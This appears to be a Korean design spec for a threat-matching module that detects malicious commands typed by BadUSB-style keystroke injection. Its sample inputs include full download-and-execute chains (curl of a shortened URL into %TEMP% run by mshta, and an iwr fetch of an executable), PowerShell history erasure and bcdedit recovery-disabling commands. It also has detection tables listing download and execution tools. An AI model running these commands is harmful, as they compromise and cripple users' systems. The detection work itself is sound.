# ThreatMatcher 구현 명세서

> 작성 기준: `key_decoder.h` (DecodeResult 구조체) + 현재 `key_decoder.cpp` 구현  
> 점수 체계는 별도 협의 후 결정 — 이 문서에는 포함하지 않음.  
> 핫키/모듈 간 조합 분석은 **다른 모듈 담당** (§9 참고).

---

## 1. ThreatMatcher 개요

### 1.1 위치

```
vector<KeyRecord>
    → KeyNormalizer        (텍스트 줄 + 핫키)
    → UrlExtractor         (URL 추출/디코딩)
    → CommandParser        (명령어 파싱 + 괄호 추출 + . 제거)   ← key_decoder
    → [DecodeResult]
          ↓ 입력
    ThreatMatcher::Analyze(decoded)   ← 이 문서 대상
          ↓ 출력
    ThreatResult
          ↓
    CompoundScorer (전 모듈 결과 종합)
```

### 1.2 한 줄 정의

```
DecodeResult (명령어 + 인자 + URL + 핫키) 를 받아서
ThreatResult (카테고리 마스크 + 매칭 명세 + 패턴 플래그) 를 반환
```

### 1.3 API 시그니처

```cpp
namespace ThreatMatcher
{
    ThreatResult Analyze(const KeyDecoder::DecodeResult& decoded);
}
```

---

## 2. 입력 데이터: DecodeResult 명세 ⭐

`key_decoder.h` 에 정의된 구조체를 그대로 받습니다.

```cpp
struct UrlInfo {
    std::wstring raw;        // Chr() 포함 원문
    std::wstring resolved;   // 디코딩 완료 (https://...)
    size_t       lineIndex;
};

struct DecodedLine {
    std::wstring          text;   // 정규화된 한 줄
    std::vector<UrlInfo>  urls;   // 이 줄에서 추출된 URL
};

struct HotkeyEvent {
    std::wstring combo;            // "Win+R", "Ctrl+S", "Alt+F4"
    size_t       lineIndex;
};

struct ParsedCommand {
    std::wstring              command;   // 소문자 정규화 보장
    std::vector<std::wstring> args;      // 케이스 보존 보장
    size_t                    lineIndex;
};

struct DecodeResult {
    std::vector<DecodedLine>    lines;
    std::vector<HotkeyEvent>    hotkeys;
    std::vector<ParsedCommand>  commands;
    std::wstring                fullText;
};
```

### 2.1 필드별 보장 사항 (data contract)

| 필드 | 보장 사항 | 활용 |
|------|---------|------|
| `commands[].command` | 항상 **소문자**, 트림 완료 | DB exact match 가능 |
| `commands[].args` | **원본 케이스 유지**, 트림 완료 | `-f` vs `-F` 구분 가능 |
| `commands[].lineIndex` | 원본 줄 인덱스 (체인 분리해도 같은 값) | 같은 줄 명령어 묶기 |
| `lines[].urls` | UrlExtractor 추출/디코딩 완료 | 인자에 URL 등장 확인 |
| `hotkeys[]` | Win+R 등 단축키 이벤트 | **ThreatMatcher 사용 안 함** (§9 참고) |
| `fullText` | 전체 텍스트 (`\n` 구분) | Phase 4 정규식 스캔용 |

### 2.2 ParsedCommand 추가 보장 (key_decoder가 보장)

- `command` 가 `(`, `{`, `if(`, `while(` 같은 노이즈로 시작하지 **않음** → key_decoder가 정리 완료
- 토큰 선두의 `.` (메서드/프로퍼티 접근자) **제거됨** → `.HistorySavePath` → `HistorySavePath`
- `(...)`, `{...}`, `$(...)` 안의 cmdlet은 **별도 ParsedCommand로 분리되어 들어옴**

---

## 3. PreAnalysis(key_decoder)에서 끝낸 일

ThreatMatcher가 **다시 할 필요 없는** 처리들. 참고용.

### 3.1 명령어 토큰화 규칙

```
공백/탭 기준 split
    ↓
첫 토큰 → command (lowercase)
나머지 → args (case 보존, / 접두 그대로 유지)
```

`/c` → `-c` 같은 정규화는 **하지 않음.** 인자는 케이스/접두 그대로 보존.

### 3.2 체인 분리

`&&`, `||`, `|`, `;` 기준으로 분리해서 각 세그먼트가 독립 ParsedCommand 가 됨.  
같은 줄에서 분리됐으면 모두 동일한 `lineIndex` 를 가짐.

```
"cmd /c curl ... && mshta ..."
       ↓ 분리
{ "cmd",   ["/c", "curl", ...],  lineIndex=0 }
{ "mshta", ["..."],              lineIndex=0 }   ← 같은 lineIndex
```

### 3.3 괄호/중괄호 추출 (방법 E)

`(...)`, `{...}`, `$(...)` 안에 cmdlet이 있으면 추출 후 **별도 ParsedCommand로 추가**.

```
"Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
       ↓
{ "remove-item", ["(Get-PSReadlineOption).HistorySavePath",
                  "-ErrorAction", "SilentlyContinue"], lineIndex=2 }
{ "get-psreadlineoption", [], lineIndex=2 }   ← 추출되어 추가됨
```

#### 처리된 예외 케이스 (구현자가 신경 안 써도 됨)

| 케이스 | 처리 |
|--------|------|
| 따옴표 안의 괄호 (`echo "(text)"`) | arg 시작이 `"` / `'` 이면 추출 skip |
| 중첩 괄호 (`(Get-Item (X).Path)`) | 깊이 카운터로 짝 맞는 `)` 찾음 |
| `$()` 서브익스프레션 (`"$(Get-Date)"`) | `$` + `(` 도 추출 대상 |
| 짝 안 맞는 괄호 | 닫는 괄호 못 찾으면 skip |
| `@(...)`, `@{...}` 배열/해시 | 시작이 `@` 라 자동 회피 |
| 다중 괄호 (`(a) -arg (b)`) | for 루프가 각 arg 독립 처리 |

### 3.4 선두 `.` 제거

```
.HistorySavePath  → HistorySavePath
.MinimizeAll      → MinimizeAll
Shell.Application → Shell.Application   (시작이 . 아님 → 유지)
WinHTTPRequest.5.1 → WinHTTPRequest.5.1 (중간 . → 유지)
```

### 3.5 처리된 입력 케이스 종합

| Case | 입력 예시 | key_decoder 결과 |
|------|---------|----------------|
| A | `iwr https://... -OutFile "$env:TEMP\h.exe"` | 정상 ParsedCommand |
| B | `cmd /c curl ... && mshta ...` | 체인 분리 → 2개 ParsedCommand (같은 lineIndex) |
| C | `if(Test-Path ...){Start-Process ...}` | `if(test-path` 로 들어옴 (key_decoder 한계, §4.1) |
| D | VBScript 소스 (`Set x=...`, `x.Open ...`) | DB에 없는 토큰 → no-match 예정 |
| E | `(New-Object ...).MinimizeAll()` | `(` 제거되어 `new-object`, `MinimizeAll` 둘 다 ParsedCommand |
| F | URL이 args 첫 토큰 | 그대로 들어옴, `lines[].urls` 와 cross-ref 가능 |
| G | `iwr ... -OutFile $env:TEMP\h.exe` | TEMP_PATH 패턴 인자 보존 |
| H | `Remove-Item (Get-PSReadlineOption)...` | 추출되어 `get-psreadlineoption` 별도 추가 |

---

## 4. PreAnalysis가 못 잡는 것 (ThreatMatcher 책임)

### 4.1 제어구조에 묻힌 cmdlet

```
"if(Test-Path ...){Start-Process \"$env:TEMP\h.exe\"}"
        ↓
{ "if(test-path", [...] }   ← if( 가 붙어서 들어옴, DB no-match
```

`Start-Process` 가 `{}` 안에 있어서 토크나이저 기준으로 추출 안 됨.  
**→ Phase 4 fullText 정규식 스캔으로 보완.**

### 4.2 BCD/CMD 식별자 노이즈

```
"bcdedit /set {default} recoveryenabled no"
        ↓ key_decoder의 괄호 추출
{ "bcdedit", ["/set", "{default}", ...], lineIndex=1 }
{ "default", [], lineIndex=1 }   ← {default} 가 식별자인데 cmdlet으로 추출됨
```

**현상:** `bcdedit`, `bcdboot` 같은 명령어는 `{default}`, `{bootmgr}` 같은 BCD 식별자를 인자로 받음. key_decoder는 이게 cmdlet인지 식별자인지 모르고 추출.

**대응 옵션:**
- (A) ThreatMatcher가 DB no-match로 자연 무시 (권장 — 무해)
- (B) key_decoder에 휴리스틱 추가 — 추출된 inner가 공백/`-`/`/` 없으면 식별자로 판단해 skip

```cpp
// 옵션 B 휴리스틱 (key_decoder 측)
if (inner.find(L' ') == std::wstring::npos &&
    inner.find(L'-') == std::wstring::npos &&
    inner.find(L'/') == std::wstring::npos)
    continue;  // 식별자로 보고 skip
```

현재는 옵션 A 채택 (DB 미등록 → 무시). 노이즈가 거슬리면 옵션 B로 변경.

### 4.3 따옴표 내부 매몰

```
"Invoke-Expression \"Start-Process calc\""
        ↓
{ "invoke-expression", ["\"Start-Process calc\""] }
```

따옴표 안의 `Start-Process` 는 추출 대상이 아니라 정상 인자 값으로 취급.  
**→ Phase 4 정규식 스캔으로 보완.**

---

## 5. ThreatMatcher 구현 가이드 ⭐

### 5.1 전체 흐름

```
for cmd in decoded.commands:
    Phase 1: command 이름 → CommandDef 매칭
    Phase 2: args 플래그 → ArgDef 매칭
    Phase 3: args 값 분석 (URL, 임시경로, 실행파일, ComObject, enum 값)
    → CommandMatch 누적

Phase 4: decoded.fullText → 정규식 cmdlet 보완 스캔

Phase 5: 같은 lineIndex 명령어 카테고리 조합 분석 (체인 패턴)
```

### 5.2 Phase 1 — 명령어 이름 매칭

```cpp
for (auto& cmd : decoded.commands) {
    const CommandDef* def = LookupCommand(cmd.command);
    if (!def) continue;  // DB 미등록 → skip

    CommandMatch match;
    match.command  = def->name;
    match.category = def->category;
    match.lineIndex = cmd.lineIndex;
    // Phase 2/3 진행
    ...
}

// LookupCommand:
//   1. cmd.command 로 정규명 exact match
//   2. 없으면 alias 테이블 조회 ("iwr" → "invoke-webrequest")
```

### 5.3 Phase 2 — 인자 플래그 매칭

```cpp
for (auto& arg : cmd.args) {
    if (arg.empty()) continue;
    if (arg[0] != L'-' && arg[0] != L'/') continue;   // 플래그만 대상

    for (size_t i = 0; i < def->argCount; ++i) {
        const ArgDef& a = def->args[i];
        bool hit = a.caseSens ? (arg == a.pattern)
                              : EqualsIgnoreCase(arg, a.pattern);
        if (hit) {
            match.matchedTags.push_back(a.tag);
            break;
        }
    }
}
```

**주의:** `-f` 와 `-F` 가 다르면 `caseSens = true`. 대부분 인자는 `caseSens = false`.

### 5.4 Phase 3 — 인자 값 분석

플래그 다음 토큰의 **값 자체**를 검사.

```cpp
for (size_t i = 0; i + 1 < cmd.args.size(); ++i) {
    if (!IsFlag(cmd.args[i])) continue;
    const std::wstring& val = cmd.args[i + 1];

    // [A] URL 인자
    if (StartsWith(val, L"http://") || StartsWith(val, L"https://"))
        match.hasUrlArg = true;

    // [B] 임시 경로
    if (Contains(val, L"%TEMP%") || Contains(val, L"$env:TEMP") ||
        Contains(val, L"%APPDATA%") || Contains(val, L"$env:APPDATA"))
        match.hasTempPath = true;

    // [C] 실행파일 확장자
    if (EndsWith(val, L".exe") || EndsWith(val, L".hta") ||
        EndsWith(val, L".vbs") || EndsWith(val, L".bat") ||
        EndsWith(val, L".ps1") || EndsWith(val, L".js")  ||
        EndsWith(val, L".dll"))
        match.hasExeExt = true;

    // [D] -ComObject 값 (위험 ProgID 매칭)
    if (EqualsIgnoreCase(cmd.args[i], L"-ComObject")) {
        if (IsDangerousComObject(val)) {
            match.hasDangerousComObject = true;
            // ComObject 종류에 따라 category 상향 (DB 보조 테이블 §6.6)
        }
    }

    // [E] enum 값 위협 매칭 (§6.5)
    LookupEnumThreat(cmd.args[i], val, match);
}
```

### 5.5 Phase 4 — fullText 정규식 cmdlet 보완 스캔

`commands[]` 순회 후, `decoded.fullText` 에서 PowerShell `Verb-Noun` 패턴 추출.

```cpp
std::wregex pat(LR"(\b([A-Z][a-zA-Z]+)-([A-Z][a-zA-Z]+)\b)");

auto begin = std::wsregex_iterator(decoded.fullText.begin(),
                                    decoded.fullText.end(), pat);
auto end   = std::wsregex_iterator();

for (auto it = begin; it != end; ++it) {
    std::wstring name = ToLower(it->str());
    const CommandDef* def = LookupCommand(name);
    if (!def) continue;
    if (AlreadyMatched(name, result.matches)) continue;   // Phase 1 중복 방지

    CommandMatch m;
    m.command       = def->name;
    m.category      = def->category;
    m.fromSecondary = true;
    result.matches.push_back(m);
}
```

**한계:** Phase 4는 **존재만** 감지. args 정보 없음 → Phase 2/3 분석 불가.

### 5.6 Phase 5 — 같은 줄 카테고리 체인 감지

같은 `lineIndex` 명령어들의 카테고리 조합 분석.

```cpp
std::map<size_t, uint32_t> lineCategoryMask;
for (auto& m : result.matches)
    lineCategoryMask[m.lineIndex] |= m.category;

for (auto& [line, mask] : lineCategoryMask) {
    if ((mask & CAT_DOWNLOAD) && (mask & CAT_EXECUTOR))
        result.patternFlags |= PATTERN_CHAIN_DOWNLOAD_EXEC;

    // 같은 줄에 SHELL + DOWNLOAD → 셸에서 다운로드 직접 실행 패턴
    if ((mask & CAT_SHELL) && (mask & CAT_DOWNLOAD))
        result.patternFlags |= PATTERN_SHELL_DOWNLOAD;
}
```

---

## 6. DB 설계 가이드

### 6.1 명령어 카테고리

```cpp
enum CommandCategory : uint32_t {
    CAT_NONE      = 0,
    CAT_SHELL     = 1 << 0,  // powershell, cmd, wmic, bash
    CAT_DOWNLOAD  = 1 << 1,  // curl, wget, iwr, certutil, bitsadmin
    CAT_EXECUTOR  = 1 << 2,  // mshta, wscript, cscript, rundll32, start-process, iex
    CAT_PERSIST   = 1 << 3,  // New-ScheduledTask, Set-ItemProperty(레지스트리)
    CAT_OBFUSCATE = 1 << 4,  // 직접 매칭은 ArgDef로, 카테고리는 보조용
    CAT_DESTROY   = 1 << 5,  // Remove-Item -Recurse -Force, Format-Volume, bcdedit
    CAT_RECON     = 1 << 6,  // whoami, ipconfig, netstat
};
```

### 6.2 인자 태그

```cpp
enum ArgTag {
    // SCIA: S
    ATAG_REMOTE_TARGET,       // -ComputerName, -Session
    ATAG_CREDENTIAL,          // -Credential, -Authentication
    ATAG_PRIVILEGE,           // -RunAsAdministrator, -EnableNetworkAccess
    ATAG_CONNECTION_ENDPOINT, // -ConnectionUri, -Proxy, -Port

    // SCIA: C
    ATAG_FILE_TRANSFER,       // -OutFile, -Destination, -o
    ATAG_QUERY_FILTER,        // -Filter, -Query

    // SCIA: I
    ATAG_SCRIPT_PAYLOAD,      // -ScriptBlock, -EncodedCommand, -enc, -Command, -c
    ATAG_FORCE_CHANGE,        // -Force
    ATAG_PERSISTENCE_TRIGGER, // -Trigger, -AtStartup, -AtLogOn
    ATAG_OBFUSCATION,         // -WindowStyle Hidden, -ep Bypass 등 (값까지 봐야 함)
    ATAG_COMOBJECT,           // -ComObject (값에 따라 분기)

    // SCIA: A
    ATAG_RECURSIVE,           // -Recurse, -Depth
    ATAG_JOB_CONTROL,         // -AsJob, -ThrottleLimit
};
```

### 6.3 ArgDef / CommandDef

```cpp
struct ArgDef {
    const wchar_t* pattern;   // "-OutFile", "-enc", "/c"
    bool           caseSens;
    ArgTag         tag;
    const wchar_t* desc;
};

struct CommandDef {
    const wchar_t*  name;         // 소문자 정규명 (예: "invoke-webrequest")
    const wchar_t** aliases;      // {"iwr", "wget", "curl"}
    size_t          aliasCount;
    CommandCategory category;
    const ArgDef*   args;
    size_t          argCount;
};
```

### 6.4 등록 명령어 목록

| 정규명 | 별칭 | 카테고리 |
|--------|------|---------|
| `powershell` | `pwsh` | SHELL |
| `cmd` | — | SHELL |
| `wmic` | — | SHELL |
| `invoke-webrequest` | `iwr`, `wget`, `curl` | DOWNLOAD |
| `invoke-restmethod` | `irm` | DOWNLOAD |
| `start-bitstransfer` | — | DOWNLOAD |
| `certutil` | — | DOWNLOAD \| OBFUSCATE |
| `bitsadmin` | — | DOWNLOAD |
| `mshta` | — | EXECUTOR |
| `wscript` | — | EXECUTOR |
| `cscript` | — | EXECUTOR |
| `rundll32` | — | EXECUTOR |
| `regsvr32` | — | EXECUTOR |
| `invoke-expression` | `iex` | EXECUTOR |
| `invoke-command` | `icm` | EXECUTOR |
| `start-process` | `saps`, `start` | EXECUTOR |
| `new-object` | — | EXECUTOR (잠재, ComObject 값으로 확정) |
| `new-scheduledtask` | — | PERSIST |
| `register-scheduledjob` | — | PERSIST |
| `set-itemproperty` | — | PERSIST |
| `remove-item` | `ri`, `del`, `rm`, `erase` | DESTROY |
| `format-volume` | — | DESTROY |
| `bcdedit` | — | DESTROY (복구 환경 차단) |
| `bcdboot` | — | DESTROY |
| `whoami` | — | RECON |
| `ipconfig` | — | RECON |
| `netstat` | — | RECON |

### 6.5 enum 값 위협 테이블 (5개 핵심)

`-flag value` 형태에서 **값** 까지 봐야 위협인 케이스. 모든 cmdlet 공통.

```cpp
struct EnumThreat {
    const wchar_t* paramName;   // "-ExecutionPolicy"
    const wchar_t* aliasName;   // "-ep" (없으면 nullptr)
    const wchar_t* enumValue;   // "Bypass" (case-insensitive 매칭)
    ArgTag         tag;
};

EnumThreat enumThreats[] = {
    { L"-ExecutionPolicy", L"-ep", L"Bypass",           ATAG_OBFUSCATION },
    { L"-ExecutionPolicy", L"-ep", L"Unrestricted",     ATAG_OBFUSCATION },
    { L"-WindowStyle",     nullptr, L"Hidden",           ATAG_OBFUSCATION },
    { L"-ErrorAction",     L"-ea", L"SilentlyContinue", ATAG_OBFUSCATION },
    { L"-ErrorAction",     L"-ea", L"Ignore",            ATAG_OBFUSCATION },
    { L"-Scope",           nullptr, L"Process",          ATAG_PRIVILEGE   },
    { L"-Scope",           nullptr, L"CurrentUser",      ATAG_PRIVILEGE   },
    { L"-Authentication",  nullptr, L"Basic",            ATAG_CREDENTIAL  },
    { L"-Authentication",  nullptr, L"CredSSP",          ATAG_CREDENTIAL  },
};
```

### 6.6 위험 ComObject 값 목록 (보조)

`-ComObject` 다음 토큰 값으로 분류.

| ComObject 값 | 확정 카테고리 |
|-------------|------------|
| `WScript.Shell` | EXECUTOR |
| `WinHTTP.WinHTTPRequest.*` | DOWNLOAD |
| `MSXML2.XMLHTTP*` | DOWNLOAD |
| `Scripting.FileSystemObject` | DESTROY 잠재 |
| `InternetExplorer.Application` | EXECUTOR |
| `Shell.Application` | 낮음 (화면 조작) |

---

## 7. 출력 데이터: ThreatResult 명세

```cpp
struct CommandMatch {
    std::wstring        command;        // 매칭된 정규명
    CommandCategory     category;
    size_t              lineIndex;
    std::vector<ArgTag> matchedTags;
    bool                hasUrlArg;
    bool                hasTempPath;
    bool                hasExeExt;
    bool                hasDangerousComObject;
    bool                fromSecondary;  // Phase 4 정규식 스캔
};

struct ThreatResult {
    uint32_t                   categoryMask;   // 감지 카테고리 비트마스크 (CAT_*)
    uint32_t                   patternFlags;   // 복합 패턴 비트마스크 (PATTERN_*)
    std::vector<CommandMatch>  matches;
    std::wstring               summary;        // 로그/UI 요약 문자열
};
```

---

## 8. ThreatMatcher 내부 복합 패턴

**다른 모듈 정보 필요 없는** 패턴만 (단일 명령어 + 같은 줄 조합).

| 패턴 플래그 | 감지 조건 |
|----------|---------|
| `PATTERN_CHAIN_DOWNLOAD_EXEC` | 같은 lineIndex에 DOWNLOAD + EXECUTOR (`&&` 체인) |
| `PATTERN_SHELL_DOWNLOAD` | 같은 lineIndex에 SHELL + DOWNLOAD |
| `PATTERN_OBFUSCATED_PS` | `powershell` + `-enc` / `-EncodedCommand` |
| `PATTERN_DIRECT_REMOTE_EXEC` | EXECUTOR 명령어의 args에 URL 직접 포함 (`mshta http://...`) |
| `PATTERN_HISTORY_ERASE` | `remove-item` args에 `HistorySavePath` 포함 |
| `PATTERN_DEFENDER_BYPASS` | `Add-MpPreference -ExclusionPath` 또는 `Set-MpPreference -Disable*` |
| `PATTERN_DANGEROUS_COMOBJECT` | `new-object -ComObject WScript.Shell` 등 |
| `PATTERN_BCD_RECOVERY_BLOCK` | `bcdedit` + `recoveryenabled no` / `displaybootmenu no` 등 |

---

## 9. 책임 영역 밖 (다른 모듈 담당)

ThreatMatcher 가 **하지 않는** 분석. SPEC 명확히 하기 위해 명시.

### ShellDetector 담당
- 핫키 분석 (`Win+R`, `Win+X→A` 등)
- 셸 진입 컨텍스트 판정 (`shellOpened`, `elevated`)
- "Win+R 누른 직후 명령어 입력" 같은 셸 오프너 감지

### UrlClassifier 담당
- URL 도메인 평판 (단축 URL, 알려진 악성 도메인)
- IP 직접 접근, 페이스트빈, IDN 호모그래프 등

### CompoundScorer 담당
- ShellDetector + ThreatMatcher + UrlClassifier 결과를 조합한 패턴
  - **`BADUSB_CLASSIC`**: Win+R + DOWNLOAD + 단축 URL 조합
  - **`TEMP_EXEC_CHAIN`**: 다운→임시경로→다른 줄에서 실행 (다중 줄 추적)
  - **`SCRIPT_SAVED`**: Notepad + Ctrl+S + .vbs 저장 흐름
- TypingAnalyzer 결과(자동 입력 의심) 합산
- 최종 위협 등급 산정

---

## 10. 샘플 입력별 예상 출력

### Sample 1: CMD 직접 실행
```
입력 텍스트: cmd /c curl -sL https://bit.ly/47OkUuD -o %TEMP%\c.hta && mshta %TEMP%\c.hta
hotkeys:    Win+R       (← ThreatMatcher 사용 안 함, ShellDetector 영역)
URL:        https://bit.ly/47OkUuD

ParsedCommand:
  { "cmd",   ["/c", "curl", "-sL", "https://...", "-o", "%TEMP%\c.hta"], 0 }
  { "mshta", ["%TEMP%\c.hta"], 0 }

ThreatMatcher 처리:
  Phase 1: cmd → CAT_SHELL,  mshta → CAT_EXECUTOR
  Phase 3: mshta args[0] = "%TEMP%\c.hta" → hasTempPath, hasExeExt
  Phase 5: 같은 lineIndex에 SHELL + EXECUTOR → PATTERN_SHELL_DOWNLOAD?
                                              (DOWNLOAD 명시적 매칭 없으므로 X)

ThreatResult:
  categoryMask: CAT_SHELL | CAT_EXECUTOR
  patternFlags: 0 (DOWNLOAD 카테고리는 cmd가 들고 있지 않으므로)
  matches: [ {cmd, SHELL, line0}, {mshta, EXECUTOR, line0, hasTempPath, hasExeExt} ]
```

### Sample 2: PowerShell 직접 실행
```
입력 텍스트:
  powershell -ep bypass
  (New-Object -ComObject Shell.Application).MinimizeAll()
  iwr https://github.com/.../hack.exe -OutFile "$env:TEMP\hack.exe";
  if(Test-Path "$env:TEMP\hack.exe"){Start-Process "$env:TEMP\hack.exe"};
  Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue;
  exit

ParsedCommand (key_decoder가 정리해서 넘김):
  { "powershell",  ["-ep", "bypass"], 0 }
  { "new-object",  ["-ComObject", "Shell.Application", "MinimizeAll"], 1 }   ← 추출됨
  { "iwr",         ["https://...", "-OutFile", "$env:TEMP\hack.exe"], 2 }
  { "if(test-path", [...], 3 }   ← 제어구조, Phase 1 no-match
  { "remove-item", ["(Get-PSReadlineOption).HistorySavePath",
                    "-ErrorAction", "SilentlyContinue"], 4 }
  { "get-psreadlineoption", [], 4 }   ← 추출됨
  { "exit", [], 5 }

ThreatMatcher 처리:
  Phase 1: powershell → SHELL
           new-object → EXECUTOR (잠재)
           iwr → DOWNLOAD
           remove-item → DESTROY
           get-psreadlineoption → no-match
           exit → no-match
  Phase 2: powershell args["-ep"] → enum 값 "bypass" → ATAG_OBFUSCATION
           iwr args["-OutFile"] → ATAG_FILE_TRANSFER
           remove-item args["-ErrorAction"] → enum 값 "SilentlyContinue" → ATAG_OBFUSCATION
           new-object args["-ComObject"] → 값 "Shell.Application" → 위험 X
  Phase 3: iwr args에 URL + TEMP_PATH + EXE_EXT
           remove-item args에 "HistorySavePath" 문자열 포함
  Phase 4: fullText에서 "Start-Process" 발견 → CommandMatch 추가 (fromSecondary)
  Phase 5: 줄별 카테고리 — 단일 줄에 DOWNLOAD+EXECUTOR 조합 없음 → 체인 패턴 X

ThreatResult:
  categoryMask: CAT_SHELL | CAT_DOWNLOAD | CAT_EXECUTOR | CAT_DESTROY
  patternFlags: PATTERN_HISTORY_ERASE
  matches: [...] (각 명령어별 CommandMatch)
```

### Sample 3: bcdedit 복구 차단
```
입력 텍스트:
  cmd
  bcdedit /set {default} recoveryenabled no
  bcdedit /set {default} bootstatuspolicy ignoreallfailures
  bcdedit /set {bootmgr} displaybootmenu no
  bcdedit /set {default} autorecoverkeyselected no
  exit

hotkeys: Win+R, Alt+Y       (← ThreatMatcher 사용 안 함)

ParsedCommand:
  { "cmd", [], 0 }
  { "bcdedit", ["/set", "{default}", "recoveryenabled", "no"], 1 }
  { "bcdedit", ["/set", "{default}", "bootstatuspolicy", "ignoreallfailures"], 2 }
  { "bcdedit", ["/set", "{bootmgr}", "displaybootmenu", "no"], 3 }
  { "bcdedit", ["/set", "{default}", "autorecoverkeyselected", "no"], 4 }
  { "exit", [], 5 }
  { "default", [], 1 }   ← key_decoder 추출 (BCD 식별자, 노이즈)
  { "default", [], 2 }
  { "bootmgr", [], 3 }
  { "default", [], 4 }

ThreatMatcher 처리:
  Phase 1: cmd → SHELL
           bcdedit (×4) → DESTROY
           default, bootmgr → no-match (DB 미등록, 자연 무시 §4.2)
           exit → no-match
  Phase 2: bcdedit /set 매칭 → ATAG_FORCE_CHANGE
  Phase 5: 같은 줄에 SHELL+DESTROY 조합 X (cmd만 line 0, bcdedit는 line 1~4)

  추가 패턴: bcdedit args에 "recoveryenabled no" / "displaybootmenu no" 등
           → PATTERN_BCD_RECOVERY_BLOCK

ThreatResult:
  categoryMask: CAT_SHELL | CAT_DESTROY
  patternFlags: PATTERN_BCD_RECOVERY_BLOCK
```

---

## 11. 구현 우선순위

1. **DB 구축 + Phase 1** — CommandDef 테이블 + alias 매칭 (가장 큰 작업, 우선)
2. **Phase 2** — ArgDef 매칭
3. **Phase 5** — 같은 줄 카테고리 체인 (구현 단순, 효과 큼)
4. **Phase 3** — 인자 값 분석 (URL/TEMP/EXE/ComObject/enum)
5. **Phase 4** — fullText 정규식 보완 스캔
6. **복합 패턴** — §8 패턴 플래그 채우기

핫키 / 모듈 간 조합은 **이 SPEC 범위 밖** (§9 참고).
